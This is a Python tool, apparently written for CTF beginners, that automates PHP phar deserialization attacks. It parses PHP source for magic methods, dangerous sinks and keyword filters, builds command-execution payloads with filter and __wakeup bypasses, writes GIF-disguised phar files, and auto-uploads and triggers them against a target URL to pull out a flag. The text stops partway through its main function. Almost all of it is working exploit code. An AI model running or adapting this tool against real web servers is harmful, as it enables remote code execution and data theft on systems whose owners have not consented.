#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║          phar_gen.py — 通用 Phar 反序列化载荷生成器               ║
║          CTF 竞赛辅助工具 · 面向新手                              ║
╚══════════════════════════════════════════════════════════════════╝

功能:
  1. 分析 PHP 源码 → 提取类名、属性、魔术方法、sink 函数、正则过滤
  2. 根据要执行的命令自动构造 payload (含注释绕过/命令过滤绕过)
  3. 调用本机 PHP 生成正确格式的 phar 文件 (带 GIF89a 头)
  4. 可选: 自动上传 + phar:// 触发 + 提取 flag

用法:
  # 基本用法: 分析源码 + 生成 phar
  python3 phar_gen.py -f class.php --exec "cat /flag" -o evil.phar

  # 多个源码文件
  python3 phar_gen.py -f class.php -f helper.php --exec "cat /flag" -o evil.phar

  # 自动上传 + 触发 (全自动解题)
  python3 phar_gen.py -f class.php --exec "cat /flag" -t http://target:80/

  # 指定 phar 内文件名和 stub
  python3 phar_gen.py -f class.php --exec "cat /flag" --inner-file shell.php --stub jpg

  # 从 URL 获取源码
  python3 phar_gen.py --url http://target/class.php --exec "cat /flag"

  # 只分析不生成
  python3 phar_gen.py -f class.php --analyze

依赖:
  - 本机 PHP (Homebrew: /opt/homebrew/bin/php 或 brew install php)
  - Python requests (pip install requests)

作者: TeleAgent
"""

import argparse
import json
import os
import re
import subprocess
import sys
import tempfile
import textwrap
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import quote


# ════════════════════════════════════════════════════════════════════
# 第一部分: PHP 源码分析器
# ════════════════════════════════════════════════════════════════════

@dataclass
class PHPProperty:
    """PHP 类属性"""
    name: str
    visibility: str  # public / protected / private
    default_value: Optional[str] = None
    is_required: bool = False  # 无默认值，需要赋值


@dataclass
class PHPMagicMethod:
    """PHP 魔术方法"""
    name: str  # __destruct, __wakeup, __toString, etc.
    body: str  # 方法体
    sink: Optional[str] = None  # 危险函数: eval, system, assert, etc.
    sink_arg_pattern: str = ""  # sink 参数的构造方式


@dataclass
class PHPFilter:
    """过滤规则"""
    type: str  # preg_match, str_replace, stripos, etc.
    pattern: str  # 正则/匹配字符串
    blocked_items: list = field(default_factory=list)  # 被过滤的关键词
    raw_code: str = ""


@dataclass
class PHPClassAnalysis:
    """PHP 类分析结果"""
    name: str
    properties: list  # List[PHPProperty]
    magic_methods: list  # List[PHPMagicMethod]
    filters: list  # List[PHPFilter]
    trigger_function: str = ""  # 触发反序列化的函数, 如 file_exists
    trigger_param: str = ""  # 触发参数, 如 $_GET['file']
    has_wakeup: bool = False
    wakeup_bypass_needed: bool = False
    comment_char: str = ""  # eval 中的注释符 # 或 //
    eval_prefix: str = ""  # eval 中的前缀, 如 "#"
    raw_code: str = ""

    def to_summary(self) -> str:
        lines = []
        lines.append(f"类名: {self.name}")
        lines.append(f"属性:")
        for p in self.properties:
            val = f" = {p.default_value}" if p.default_value else ""
            lines.append(f"  - {p.visibility} ${p.name}{val}")
        lines.append(f"魔术方法:")
        for m in self.magic_methods:
            sink = f" → sink: {m.sink}" if m.sink else ""
            lines.append(f"  - {m.name}{sink}")
        if self.filters:
            lines.append(f"过滤:")
            for f in self.filters:
                items = ", ".join(f.blocked_items) if f.blocked_items else f.pattern
                lines.append(f"  - {f.type}({items})")
        if self.comment_char:
            lines.append(f"eval 注释符: {self.comment_char!r}")
        if self.trigger_function:
            lines.append(f"触发函数: {self.trigger_function}({self.trigger_param})")
        if self.has_wakeup:
            lines.append(f"__wakeup: 存在, 需要绕过: {'是' if self.wakeup_bypass_needed else '否'}")
        return "\n".join(lines)


class PHPSourceAnalyzer:
    """PHP 源码静态分析器"""

    # 危险函数 (sink)
    SINK_FUNCTIONS = {
        'eval': 'eval',
        'system': 'system',
        'exec': 'exec',
        'passthru': 'passthru',
        'shell_exec': 'shell_exec',
        'popen': 'popen',
        'proc_open': 'proc_open',
        'assert': 'assert',
        'preg_replace': 'preg_replace (/e)',
        'create_function': 'create_function',
        'call_user_func': 'call_user_func',
        'file_put_contents': 'file_put_contents',
        'fwrite': 'fwrite',
    }

    # 触发 phar 反序列化的函数
    PHAR_TRIGGERS = {
        'file_exists', 'is_file', 'is_dir', 'is_link', 'filemtime',
        'fileatime', 'filectime', 'filesize', 'filetype', 'fileowner',
        'filegroup', 'fileperms', 'is_readable', 'is_writable',
        'is_executable', 'copy', 'rename', 'unlink', 'stat',
        'fopen', 'file_get_contents', 'file', 'finfo_file',
        'getimagesize', 'md5_file', 'sha1_file', 'parse_ini_file',
        'getallheaders', 'get_meta_tags', 'exif_thumbnail',
        'hash_file', 'hash_hmac_file', 'hash_update_file',
    }

    def __init__(self):
        self.classes = []
        self.global_code = ""

    def analyze(self, source: str) -> list:
        """分析 PHP 源码, 返回类分析结果列表"""
        # 去除 PHP 标签
        source = re.sub(r'<\?php\s*', '', source)
        source = re.sub(r'<\?=\s*', '', source)
        source = re.sub(r'\?>', '', source)

        self.global_code = source

        # 提取类
        classes = self._extract_classes(source)

        results = []
        for class_name, class_body in classes:
            analysis = self._analyze_class(class_name, class_body, source)
            results.append(analysis)

        # 如果没有类，检查全局代码中的触发函数
        if not results:
            analysis = PHPClassAnalysis(
                name="(无类)",
                properties=[],
                magic_methods=[],
                filters=[],
                raw_code=source
            )
            trigger = self._find_trigger(source)
            if trigger:
                analysis.trigger_function = trigger[0]
                analysis.trigger_param = trigger[1]
            results.append(analysis)

        return results

    def _extract_classes(self, source: str) -> list:
        """提取所有类的定义"""
        classes = []
        # 匹配 class 定义
        pattern = r'class\s+(\w+)(?:\s+extends\s+\w+)?(?:\s+implements\s+[\w,\s]+)?\s*\{'
        for match in re.finditer(pattern, source):
            class_name = match.group(1)
            # 从 { 开始, 找到匹配的 }
            start = match.end() - 1
            depth = 0
            end = start
            for i in range(start, len(source)):
                if source[i] == '{':
                    depth += 1
                elif source[i] == '}':
                    depth -= 1
                    if depth == 0:
                        end = i
                        break
            class_body = source[start + 1:end]
            classes.append((class_name, class_body))

        return classes

    def _analyze_class(self, class_name: str, class_body: str, full_source: str) -> PHPClassAnalysis:
        """分析单个类"""
        analysis = PHPClassAnalysis(
            name=class_name,
            properties=[],
            magic_methods=[],
            filters=[],
            raw_code=class_body
        )

        # 提取属性
        analysis.properties = self._extract_properties(class_body)

        # 提取魔术方法
        analysis.magic_methods = self._extract_magic_methods(class_body)

        # 分析 __destruct / __wakeup 中的 sink 和过滤
        for method in analysis.magic_methods:
            if method.sink:
                method.sink_arg_pattern = self._analyze_sink_arg(method, analysis)

        # 提取过滤
        analysis.filters = self._extract_filters(class_body)

        # 检查 eval 注释
        for method in analysis.magic_methods:
            eval_match = re.search(r'eval\s*\(\s*["\']([#\/]+)', method.body)
            if eval_match:
                analysis.comment_char = eval_match.group(1)[0]
                analysis.eval_prefix = eval_match.group(1)

        # 检查 __wakeup
        for method in analysis.magic_methods:
            if method.name == '__wakeup':
                analysis.has_wakeup = True
                # 检查 wakeup 是否会 die/die() 阻止执行
                if re.search(r'\bdie\s*\(|\bexit\s*\(', method.body):
                    analysis.wakeup_bypass_needed = True

        # 在全局代码中查找触发函数
        trigger = self._find_trigger(full_source)
        if trigger:
            analysis.trigger_function = trigger[0]
            analysis.trigger_param = trigger[1]

        return analysis

    def _extract_properties(self, class_body: str) -> list:
        """提取类属性"""
        props = []
        # 匹配: public/protected/private/static $var [= value];
        pattern = r'(public|protected|private)\s+(?:static\s+)?\$(\w+)(?:\s*=\s*([^;]+))?'
        for match in re.finditer(pattern, class_body):
            visibility = match.group(1)
            name = match.group(2)
            default = match.group(3).strip() if match.group(3) else None
            # 清理默认值中的引号
            if default:
                default = default.rstrip(';').strip()
            props.append(PHPProperty(
                name=name,
                visibility=visibility,
                default_value=default
            ))
        return props

    def _extract_magic_methods(self, class_body: str) -> list:
        """提取魔术方法"""
        methods = []
        magic_names = [
            '__construct', '__destruct', '__wakeup', '__sleep',
            '__toString', '__call', '__callStatic', '__get',
            '__set', '__isset', '__unset', '__invoke',
            '__clone', '__serialize', '__unserialize'
        ]

        for name in magic_names:
            # 匹配方法定义
            pattern = rf'(?:public|protected|private)?\s*function\s+{re.escape(name)}\s*\([^)]*\)\s*\{{'
            match = re.search(pattern, class_body)
            if match:
                # 提取方法体
                start = match.end() - 1
                depth = 0
                end = start
                for i in range(start, len(class_body)):
                    if class_body[i] == '{':
                        depth += 1
                    elif class_body[i] == '}':
                        depth -= 1
                        if depth == 0:
                            end = i
                            break
                body = class_body[start + 1:end]

                # 查找 sink
                sink = None
                for sink_name in self.SINK_FUNCTIONS:
                    if re.search(rf'\b{re.escape(sink_name)}\s*[\(\s]', body):
                        sink = sink_name
                        break

                methods.append(PHPMagicMethod(
                    name=name,
                    body=body,
                    sink=sink
                ))

        return methods

    def _extract_filters(self, code: str) -> list:
        """提取过滤规则"""
        filters = []

        # preg_match
        for match in re.finditer(r'preg_match\s*\(\s*["\'](.+?)["\']', code):
            pattern = match.group(1)
            # 提取被过滤的关键词
            items = []
            if pattern.startswith('/'):
                # 去除分隔符和修饰符
                inner = pattern.strip('/').rsplit('/', 1)[0]
                # 简单提取 | 分隔的关键词
                parts = inner.split('|')
                for p in parts:
                    p = p.strip('()[]^$.')
                    if p and p not in ['', 'i']:
                        items.append(p)
            elif pattern.startswith('"') or pattern.startswith("'"):
                items.append(pattern.strip('"\''))

            filters.append(PHPFilter(
                type='preg_match',
                pattern=pattern,
                blocked_items=items,
                raw_code=match.group(0)
            ))

        # str_replace
        for match in re.finditer(r'str_replace\s*\(\s*\[?([^\]]+)\]?', code):
            raw = match.group(0)
            filters.append(PHPFilter(
                type='str_replace',
                pattern='',
                blocked_items=[],
                raw_code=raw
            ))

        # stripos / strpos
        for match in re.finditer(r'str[i]?pos\s*\([^,]+,\s*["\']([^"\']+)', code):
            filters.append(PHPFilter(
                type='stripos',
                pattern=match.group(1),
                blocked_items=[match.group(1)],
                raw_code=match.group(0)
            ))

        return filters

    def _analyze_sink_arg(self, method: PHPMagicMethod, analysis: PHPClassAnalysis) -> str:
        """分析 sink 参数如何构造"""
        body = method.body

        # eval("prefix" . $this->xxx)
        eval_match = re.search(r'eval\s*\(\s*["\']([^"\']*)["\']\s*\.\s*\$this->(\w+)', body)
        if eval_match:
            return f'eval("{eval_match.group(1)}" . $this->{eval_match.group(2)})'

        # eval($this->xxx)
        eval_match = re.search(r'eval\s*\(\s*\$this->(\w+)', body)
        if eval_match:
            return f'eval($this->{eval_match.group(1)})'

        # system($this->xxx)
        for sink in ['system', 'exec', 'passthru', 'shell_exec']:
            match = re.search(rf'{sink}\s*\(\s*\$this->(\w+)', body)
            if match:
                return f'{sink}($this->{match.group(1)})'

        return ""

    def _find_trigger(self, source: str) -> Optional[tuple]:
        """查找触发反序列化的函数调用"""
        for func_name in self.PHAR_TRIGGERS:
            # 匹配 func($_GET['xxx']) 或 func($_POST['xxx']) 等
            pattern = rf'\b{func_name}\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE|SERVER)\s*\[\s*["\']([^"\']+)\s*["\']\s*\]'
            match = re.search(pattern, source)
            if match:
                param = f"$_{match.group(0).split('$_')[1][:20]}..."
                return (func_name, match.group(1))

            # 匹配 func($var) 其中 $var 来自 $_GET
            pattern2 = rf'\b{func_name}\s*\(\s*\$(\w+)\s*\)'
            match2 = re.search(pattern2, source)
            if match2:
                var_name = match2.group(1)
                # 检查这个变量是否来自 $_GET
                if re.search(rf'\${var_name}\s*=\s*\$_(?:GET|POST|REQUEST)', source):
                    return (func_name, f"${var_name}")

        return None


# ════════════════════════════════════════════════════════════════════
# 第二部分: Payload 构造器
# ════════════════════════════════════════════════════════════════════

class PayloadBuilder:
    """根据分析结果和目标命令构造 payload"""

    # 命令读取函数绕过表
    CAT_ALTERNATIVES = ['nl', 'sort', 'head', 'tail', 'strings', 'xxd', 'od', 'rev', 'paste']
    # 常见被过滤的命令和替代
    CMD_ALTERNATIVES = {
        'cat': ['nl', 'sort', 'head', 'strings', 'xxd', 'od', 'rev', 'paste', 'grep .'],
        'tac': ['sort -r', 'nl', 'head'],
        'more': ['less', 'nl', 'head'],
        'tail': ['head', 'nl'],
        'less': ['nl', 'head'],
        'base64': ['xxd', 'od -A x -t x1'],
        'ls': ['dir', 'find .', 'echo *'],
    }

    # PHP 中不使用被过滤关键词的代码执行方式
    EXEC_FUNCTIONS = {
        'system': 'system',
        'exec': 'exec',
        'passthru': 'passthru',
        'shell_exec': 'shell_exec',
        # 反引号也行
        'backtick': '`{cmd}`',
    }

    def __init__(self, analysis: PHPClassAnalysis, command: str):
        self.analysis = analysis
        self.command = command
        self.bypass_report = []

    def build(self) -> dict:
        """构造 payload, 返回 {property_assignments: {prop: value}, phar_class_php: str}"""
        result = {
            'class_name': self.analysis.name,
            'property_assignments': {},
            'bypass_report': self.bypass_report,
            'needs_wakeup_bypass': False,
        }

        # 收集所有被过滤的关键词
        blocked = set()
        for f in self.analysis.filters:
            blocked.update(f.blocked_items)

        # 检查是否需要绕过命令过滤
        cmd = self.command
        for blocked_cmd, alternatives in self.CMD_ALTERNATIVES.items():
            if blocked_cmd in blocked and blocked_cmd in cmd:
                for alt in alternatives:
                    if not any(b in alt for b in blocked):
                        cmd = cmd.replace(blocked_cmd, alt)
                        self.bypass_report.append(f"命令绕过: '{blocked_cmd}' → '{alt}'")
                        break

        # 检查 eval 注释绕过
        comment_char = self.analysis.comment_char
        prefix = ""
        if comment_char == '#':
            prefix = self._bypass_comment(blocked)
        elif comment_char == '/':
            prefix = self._bypass_comment(blocked, char='/')

        # 构造要执行的 PHP 代码
        # 检查用户命令是否已经是完整 PHP 语句 (含函数调用)
        cmd_stripped = cmd.strip().rstrip(';').strip()
        is_php_call = '(' in cmd_stripped and ')' in cmd_stripped

        if is_php_call:
            # 用户已提供完整 PHP 函数调用 (如 system('cat /flag'))
            # 直接使用, 不再包装; 只处理命令关键词绕过
            code = f"{prefix}{cmd_stripped};"
            # 提取使用的执行函数名
            exec_func = cmd_stripped.split('(')[0].strip()
            self.bypass_report.append(f"使用用户提供的 PHP 代码: {cmd_stripped};")
        else:
            # 用户提供的是 shell 命令, 需要用执行函数包装
            # 检查 system/exec 等是否被过滤
            exec_func = 'system'
            for f in self.analysis.filters:
                for item in f.blocked_items:
                    if 'system' == item.lower():
                        exec_func = 'exec'
                    if 'exec' == item.lower():
                        exec_func = 'passthru'
                    if 'passthru' == item.lower():
                        exec_func = 'shell_exec'

            # 检查 exec_func 本身是否被过滤
            if exec_func.lower() in blocked:
                found_alt = False
                for alt_func in ['system', 'exec', 'passthru', 'shell_exec', 'popen']:
                    if alt_func.lower() not in blocked:
                        exec_func = alt_func
                        found_alt = True
                        break
                if not found_alt:
                    # 全部被过滤, 用反引号
                    code = f"{prefix}`{cmd}`;"
                    self.bypass_report.append("所有执行函数被过滤, 使用反引号执行")
                else:
                    code = f"{prefix}{exec_func}('{cmd}');"
            else:
                code = f"{prefix}{exec_func}('{cmd}');"

        # 找到需要设置的属性
        # 策略: 找到 __destruct 中 sink 引用的属性
        sink_props = self._find_sink_properties()
        if not sink_props:
            # 如果没有找到, 给所有没有默认值的属性设置
            for prop in self.analysis.properties:
                if prop.default_value is None:
                    sink_props.append(prop.name)

        for prop_name in sink_props:
            result['property_assignments'][prop_name] = code

        # 检查 __wakeup 绕过
        if self.analysis.wakeup_bypass_needed:
            result['needs_wakeup_bypass'] = True
            self.bypass_report.append("__wakeup 需要 CVE-2016-7124 绕过 (属性个数 > 实际)")

        # 检查 protected/private 属性
        for prop in self.analysis.properties:
            if prop.name in result['property_assignments']:
                vis = prop.visibility
                if vis == 'private':
                    self.bypass_report.append(
                        f"属性 ${prop.name} 是 private, "
                        f"序列化时属性名含空字节: \\x00{self.analysis.name}\\x00{prop_name}"
                    )
                elif vis == 'protected':
                    self.bypass_report.append(
                        f"属性 ${prop.name} 是 protected, "
                        f"序列化时属性名含空字节: \\x00*\\x00{prop_name}"
                    )

        result['code'] = code
        result['exec_func'] = exec_func
        result['final_command'] = cmd
        return result

    def _bypass_comment(self, blocked: set, char: str = '#') -> str:
        """构造注释绕过前缀"""
        # PHP 单行注释: # 或 //
        # 绕过方式: 用换行符让后续代码生效
        # \n (0x0a) 通常被过滤, 但 \r (0x0d) 通常不会

        # 检查 \n (0x0a) 是否被过滤
        # 需要检查原始过滤代码, 因为 urldecode("%0a") 不会出现在 blocked_items 中
        blocked_str = str(blocked)
        raw_filters = " ".join(f.raw_code for f in self.analysis.filters)
        raw_all = blocked_str + " " + raw_filters + " " + self.analysis.raw_code

        if any(kw in raw_all for kw in ['%0a', '\\x0a', '0x0a', "\\n", 'urldecode("%0a")', "urldecode('%0a')"]):
            self.bypass_report.append(f"注释绕过: '{char}' 注释过滤了 \\n(0x0a), 使用 \\r(0x0d) 绕过")
            return chr(13)  # \r

        self.bypass_report.append(f"注释绕过: 使用 \\n(0x0a) 绕过 '{char}' 注释")
        return chr(10)  # \n

    def _find_sink_properties(self) -> list:
        """找到 sink 引用的属性"""
        props = []
        for method in self.analysis.magic_methods:
            if not method.sink:
                continue
            # 从 sink_arg_pattern 中提取属性名
            match = re.search(r'\$this->(\w+)', method.sink_arg_pattern)
            if match:
                props.append(match.group(1))
        return props


# ════════════════════════════════════════════════════════════════════
# 第三部分: Phar 文件生成 (调用本机 PHP)
# ════════════════════════════════════════════════════════════════════

def string_to_php_expr(s: str) -> str:
    """
    将 Python 字符串转为 PHP 表达式, 正确处理特殊字符 (\\r \\n \\0 等)
    
    策略: 对可打印 ASCII 字符用单引号字符串, 对不可打印字符用 chr() 拼接
    例如: "\\rsystem('cat /flag');" → chr(13) . 'system(\\'cat /flag\\');'
    """
    if not s:
        return "''"
    
    parts = []
    buffer = ""
    
    for ch in s:
        o = ord(ch)
        if 32 <= o <= 126 and ch not in ("'", "\\"):
            # 可打印 ASCII (除单引号和反斜杠)
            buffer += ch
        else:
            # 先 flush buffer
            if buffer:
                parts.append("'" + buffer.replace("\\", "\\\\").replace("'", "\\'") + "'")
                buffer = ""
            # 用 chr() 表示
            parts.append(f"chr({o})")
    
    if buffer:
        parts.append("'" + buffer.replace("\\", "\\\\").replace("'", "\\'") + "'")
    
    return " . ".join(parts)


class PharGenerator:
    """调用本机 PHP 生成 phar 文件"""

    # 查找本机 PHP
    PHP_PATHS = [
        '/opt/homebrew/bin/php',
        '/opt/homebrew/Cellar/php@8.2/8.2.29/bin/php',
        '/usr/local/bin/php',
        '/usr/bin/php',
    ]

    @classmethod
    def find_php(cls) -> str:
        """查找本机 PHP 可执行文件"""
        # 先尝试 which
        try:
            result = subprocess.run(['which', 'php'], capture_output=True, text=True, timeout=5)
            if result.returncode == 0 and result.stdout.strip():
                path = result.stdout.strip()
                # 验证
                v = subprocess.run([path, '-v'], capture_output=True, text=True, timeout=5)
                if v.returncode == 0 and 'PHP' in v.stdout:
                    return path
        except:
            pass

        # 尝试已知路径
        for path in cls.PHP_PATHS:
            if os.path.exists(path) and os.access(path, os.X_OK):
                return path

        # 尝试 glob
        import glob
        for pattern in ['/opt/homebrew/Cellar/php*/**/bin/php', '/opt/homebrew/opt/php*/bin/php']:
            for p in glob.glob(pattern):
                if os.path.exists(p):
                    return p

        return None

    @classmethod
    def generate(cls, analysis: PHPClassAnalysis, payload: dict,
                 output_path: str, inner_file: str = 'test.txt',
                 stub_type: str = 'gif') -> bool:
        """
        生成 phar 文件

        Args:
            analysis: 类分析结果
            payload: payload 构造结果
            output_path: 输出文件路径
            inner_file: phar 内部文件名
            stub_type: stub 类型 (gif/jpg/png/none)
        """
        php_path = cls.find_php()
        if not php_path:
            print("错误: 未找到本机 PHP, 请先安装 (brew install php)")
            return False

        # 构造 PHP 生成脚本
        class_name = analysis.name
        if class_name == "(无类)":
            print("错误: 源码中没有找到类定义")
            return False

        # 将 payload 值转为 PHP chr() 拼接
        # 避免 \r \n \0 等特殊字符在写入文件时丢失
        prop_assigns = []
        for prop_name, value in payload['property_assignments'].items():
            php_expr = string_to_php_expr(value)
            prop_assigns.append(f"        $obj->{prop_name} = {php_expr};")

        prop_code = "\n".join(prop_assigns)

        # 构造 stub
        stub_map = {
            'gif': 'GIF89a',
            'jpg': '\\xff\\xd8\\xff\\xe0',
            'png': '\\x89PNG\\r\\n\\x1a\\n',
            'none': '',
        }
        magic = stub_map.get(stub_type, 'GIF89a')
        stub = f'"{magic}<?php __HALT_COMPILER(); ?>"'

        # 构造类定义 (只包含属性, 不包含方法)
        # 这样 PHP 就能反序列化, 然后调用原始类的方法
        prop_defs = []
        for prop in analysis.properties:
            prop_defs.append(f"    {prop.visibility} ${prop.name};")
        prop_def_code = "\n".join(prop_defs)

        # 如果需要 __wakeup 绕过, 在序列化后修改属性个数
        wakeup_bypass = ""
        if payload.get('needs_wakeup_bypass'):
            wakeup_bypass = """
        // __wakeup 绕过: 将序列化字符串中的属性个数加 1
        $serialized = serialize($obj);
        // O:4:"Evil":1:...  →  O:4:"Evil":2:...
        $serialized = preg_replace('/^(O:\\d+:"[^"]+":)(\\d+)/', '$1' . (count(get_object_vars($obj)) + 1), $serialized);
        $obj = unserialize($serialized);
"""

        # 构造完整的 PHP 脚本
        php_script = f'''<?php
// Auto-generated by phar_gen.py
error_reporting(0);
@unlink("{output_path}");

$phar = new Phar("{output_path}");
$phar->startBuffering();
$phar->addFromString("{inner_file}", "test");

class {class_name} {{
{prop_def_code}
}}

$obj = new {class_name}();
{prop_code}
{wakeup_bypass}
$phar->setMetadata($obj);
$phar->setStub({stub});
$phar->stopBuffering();

// 验证
$p = new Phar("{output_path}");
$meta = $p->getMetadata();
echo json_encode([
    "success" => true,
    "size" => filesize("{output_path}"),
    "class" => get_class($meta),
    "props" => get_object_vars($meta),
]) . "\\n";
'''

        # 写入临时文件
        with tempfile.NamedTemporaryFile(mode='w', suffix='.php', delete=False, dir='/tmp') as f:
            f.write(php_script)
            script_path = f.name

        try:
            # 执行 PHP 脚本
            result = subprocess.run(
                [php_path, '-d', 'phar.readonly=0', script_path],
                capture_output=True, text=True, timeout=30
            )

            if result.returncode != 0:
                print(f"PHP 执行错误:\n{result.stderr}")
                return False

            # 解析输出
            try:
                output = json.loads(result.stdout.strip().split('\n')[-1])
                if output.get('success'):
                    # 验证文件
                    if os.path.exists(output_path):
                        return True
                    else:
                        print(f"错误: phar 文件未生成: {output_path}")
                        return False
            except json.JSONDecodeError:
                print(f"PHP 输出解析失败:\n{result.stdout}")
                return False

        finally:
            os.unlink(script_path)

        return False


# ════════════════════════════════════════════════════════════════════
# 第四部分: 自动上传 + 触发
# ════════════════════════════════════════════════════════════════════

class AutoExploit:
    """自动上传 phar + 触发反序列化"""

    # 支持的上传端点
    UPLOAD_ENDPOINTS = ['index.php', 'upload.php', '']
    # 支持的文件字段名
    FILE_FIELDS = ['file', 'upload', 'img', 'image', 'pic']

    @staticmethod
    def _try_upload(target: str, phar_content: bytes) -> Optional[str]:
        """尝试多种上传方式, 返回保存路径或 None"""
        import requests
        import re as re_mod

        for endpoint in AutoExploit.UPLOAD_ENDPOINTS:
            url = f"{target}/{endpoint}" if endpoint else target
            for field in AutoExploit.FILE_FIELDS:
                try:
                    resp = requests.post(
                        url,
                        files={field: ("evil.gif", phar_content, "image/gif")},
                        timeout=15
                    )
                    text = resp.text

                    # 解析 "Saved to:" 响应
                    saved_match = re_mod.search(r'Saved to:\s*(.+?)\s*<', text)
                    if saved_match:
                        return saved_match.group(1).strip()

                    # 尝试从响应中提取 upload 路径
                    path_match = re_mod.search(r'upload/[\w./-]+', text)
                    if path_match and len(text) > 100:
                        return path_match.group(0)

                    # 如果响应较短且不是错误, 尝试下一个
                    if 'Target not found' in text or 'Not Found' in text:
                        continue

                except requests.exceptions.RequestException:
                    continue
        return None

    @staticmethod
    def exploit(target_url: str, phar_path: str, analysis: PHPClassAnalysis,
                inner_file: str = 'test.txt') -> Optional[str]:
        """
        自动上传 phar 文件并触发反序列化

        Returns: flag 字符串或 None
        """
        try:
            import requests
        except ImportError:
            print("错误: 需要 requests 库 (pip install requests)")
            return None

        import re as re_mod
        target = target_url.rstrip('/')

        # Step 1: 上传 phar 文件
        print("\n[1] 上传 phar 文件...")
        with open(phar_path, 'rb') as f:
            phar_content = f.read()

        saved_path = AutoExploit._try_upload(target, phar_content)

        if saved_path:
            print(f"    保存路径: {saved_path}")
        else:
            print(f"    上传失败, 尝试直接触发 (不依赖上传)...")
            saved_path = None

        # Step 2: 触发 phar 反序列化
        if saved_path:
            print(f"\n[2] 触发 phar 反序列化...")
            phar_url = f"phar://{saved_path}/{inner_file}"
        else:
            # 无法上传, 无法触发
            print("\n[-] 无法上传 phar 文件, 请手动上传后使用 -t 触发")
            return None

        # 尝试多种触发端点和参数名
        trigger_endpoints = ['class.php', 'index.php', '']
        trigger_params = ['file', 'filename', 'path', 'f']

        flag_found = None
        for ep in trigger_endpoints:
            trigger_url = f"{target}/{ep}" if ep else target
            for param in trigger_params:
                try:
                    resp2 = requests.get(trigger_url, params={param: phar_url}, timeout=15)
                    text2 = resp2.text

                    # 搜索 flag
                    flag_match = re_mod.search(r'((?:CTF|flag|FLAG|DASCTF)\d*\{[^}]+\})', text2)
                    if flag_match:
                        print(f"\n    FLAG: {flag_match.group(0)}")
                        return flag_match.group(0)

                    # 检查是否有命令输出 (响应比基线长)
                    if 'No!' not in text2 and len(text2) > 500:
                        # 可能有输出但不是标准 flag 格式
                        extra = text2[500:] if len(text2) > 500 else ''
                        flag_match2 = re_mod.search(r'((?:CTF|flag|FLAG|DASCTF)\d*\{[^}]+\})', extra)
                        if flag_match2:
                            print(f"\n    FLAG: {flag_match2.group(0)}")
                            return flag_match2.group(0)

                except requests.exceptions.RequestException:
                    continue

        # 所有触发方式都未找到 flag
        if 'No!' in text2:
            print("    [!] payload 被过滤 (Evil::No!)")
        else:
            print(f"    响应长度: {len(text2)}")
            print(f"    响应预览: {text2[:300]}")

        print("\n[-] 未能自动获取 flag, 可能需要手动调整")
        return None


# ════════════════════════════════════════════════════════════════════
# 第五部分: 主程序
# ════════════════════════════════════════════════════════════════════

def fetch_source_from_url(url: str) -> str:
    """从 URL 获取 PHP 源码"""
    try:
        import requests
        resp = requests.get(url, timeout=15)
        resp.encoding = resp.apparent_encoding or 'utf-8'

        # 如果是 highlight_file 的 HTML 输出, 提取源码
        if '<code>' in resp.text or 'highlight_file' in resp.text:
            # 从 highlight_file HTML 中提取 PHP 代码
            text = resp.text
            # 去除 HTML 标签
            text = re.sub(r'<[^>]+>', '', text)
            # HTML entity decode
            import html
            text = html.unescape(text)
            # 清理
            text = text.replace('&nbsp;', ' ').replace('&lt;', '<').replace('&gt;', '>')
            text = re.sub(r'\n\s*\n', '\n', text)
            return text
        return resp.text
    except Exception as e:
        print(f"获取源码失败: {e}")
        return ""


def print_banner():
    print("""
╔═══════════════════════════════════════════════════════════════╗
║  phar_gen.py — 通用 Phar 反序列化载荷生成器                   ║
║  CTF 辅助工具 · 分析 PHP 源码 → 自动构造 payload → 生成 phar  ║
╚═══════════════════════════════════════════════════════════════╝
""")


def main():
    parser = argparse.ArgumentParser(
        description='通用 Phar 反序列化载荷生成器 — CTF 竞赛辅助工具',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''
示例:
  # 分析 + 生成 phar
  python3 phar_gen.py -f class.php --exec "cat /flag" -o evil.phar

  # 多文件分析
  python3 phar_gen.py -f class.php -f helper.php --exec "nl /flag" -o evil.phar

  // 从 URL 获取源码
  python3 phar_gen.py --url http://target/class.php --exec "cat /flag"

  # 全自动解题 (分析+生成+上传+触发)
  python3 phar_gen.py -f class.php --exec "cat /flag" -t http://target:80/

  # 只分析不生成
  python3 phar_gen.py -f class.php --analyze

  # 指定 stub 类型
  python3 phar_gen.py -f class.php --exec "cat /flag" --stub jpg

  # 指定 phar 内部文件名
  python3 phar_gen.py -f class.php --exec "cat /flag" --inner-file shell.php
        ''')
    )

    parser.add_argument('-f', '--file', action='append', dest='files',
                        help='PHP 源码文件 (可多次指定)')
    parser.add_argument('--url', help='从 URL 获取 PHP 源码')
    parser.add_argument('--exec', required=False, default='cat /flag',
                        help='要执行的命令 (默认: cat /flag)')
    parser.add_argument('-o', '--output', default='evil.phar',
                        help='输出的 phar 文件路径 (默认: evil.phar)')
    parser.add_argument('--inner-file', default='test.txt',
                        help='phar 内部文件名 (默认: test.txt)')
    parser.add_argument('--stub', choices=['gif', 'jpg', 'png', 'none'],
                        default='gif', help='phar stub 类型 (默认: gif)')
    parser.add_argument('-t', '--target',
                        help='目标 URL (启用自动上传+触发)')
    parser.add_argument('--analyze', action='store_true',
                        help='只分析源码, 不生成 phar')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='详细输出')

    args = parser.parse_args()

    print_banner()

    # 获取源码
    source = ""
    if args.url:
        print(f"[*] 从 URL 获取源码: {args.url}")
        source = fetch_source_from_url(args.url)
        if not source:
            return
    elif args.files:
        for fpath in args.files:
            with open(fpath, 'r') as f:
                source += f.read() + "\n"
    else:
        parser.print_help()
        return

    # ── 分析源码 ──
    print("[1] 分析 PHP 源码...")
    analyzer = PHPSourceAnalyzer()
    analyses = analyzer.analyze(source)

    for i, analysis in enumerate(analyses):
        if analysis.name == "(无类)":
            continue
        print(f"\n{'─' * 50}")
        print(f"类 #{i+1}: {analysis.name}")
        print(f"{'─' * 50}")
        print(analysis.to_summary())

    # 找到有 sink 的类
    target_analysis = None
    for a in analyses:
        if a.name == "(无类)":
            continue
        for m in a.magic_methods:
            if m.sink:
                target_analysis = a
                break
        if target_analysis:
            break

    if not target_analysis:
        print("\n[!] 未找到包含 sink (危险函数) 的类")
        return

    if args.analyze:
        print(f"\n[*] 分析完成 (--analyze 模式, 不生成 phar)")
        return

    # ── 构造 payload ──
    print(f"\n[2] 构造 payload...")
    print(f"    目标命令: {args.exec}")

